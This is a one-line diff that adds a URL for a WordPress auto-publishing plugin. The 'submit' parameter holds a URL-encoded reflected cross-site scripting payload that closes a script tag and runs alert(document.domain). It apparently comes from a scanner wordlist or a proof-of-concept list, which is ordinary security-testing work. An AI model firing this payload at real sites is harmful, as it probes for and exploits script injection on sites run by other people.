@@ -1,0 +1,2 @@
+
+/wp-content/plugins/yousaytoo-auto-publishing-plugin/yousaytoo.php?submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
